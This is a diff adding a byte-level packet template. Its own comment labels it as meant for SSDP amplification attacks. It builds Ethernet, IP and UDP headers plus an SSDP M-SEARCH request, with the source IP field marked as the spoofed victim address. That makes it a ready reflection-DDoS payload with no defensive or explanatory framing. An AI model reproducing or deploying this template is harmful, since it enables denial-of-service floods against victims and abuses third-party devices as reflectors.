@@ -1,0 +1,37 @@
+# SSDP M-SEARCH Packet Template
+# L4 SSDP Amplification 공격용
+
+# L2 :: Ethernet HEADER
+@DMAC:6  # dst MAC
+@SMAC:6  # src MAC
+08 00    # Type: IP
+
+# L3 :: IP Header
+45       # Version: 4, Header Length: 20
+00       # Differentiated Service Field: 0
+00 96    # Total Length: 150 (approx)
+KK GG    # Identification (Random)
+40 00    # Flags: Don't Fragment
+40       # Time To Live: 64
+11       # Protocol: UDP
+@IPCHK:2 # Header Checksum
+@SIP:4   # Source IP (Spoofed - Victim)
+@DIP:4   # Destination IP: 239.255.255.250 or target
+
+# L4 :: UDP Header
+GK GG    # Source Port (Random)
+07 6c    # Destination Port: 1900 (SSDP)
+@UDPLEN:2 # UDP Length
+@UDPCHK:2 # UDP Checksum
+
+# SSDP M-SEARCH Request (ASCII)
+# M-SEARCH * HTTP/1.1\r\n
+4d 2d 53 45 41 52 43 48 20 2a 20 48 54 54 50 2f 31 2e 31 0d 0a
+# Host: 239.255.255.250:1900\r\n
+48 6f 73 74 3a 20 32 33 39 2e 32 35 35 2e 32 35 35 2e 32 35 30 3a 31 39 30 30 0d 0a
+# Man: "ssdp:discover"\r\n
+4d 61 6e 3a 20 22 73 73 64 70 3a 64 69 73 63 6f 76 65 72 22 0d 0a
+# MX: 2\r\n
+4d 58 3a 20 32 0d 0a
+# ST: ssdp:all\r\n\r\n
+53 54 3a 20 73 73 64 70 3a 61 6c 6c 0d 0a 0d 0a
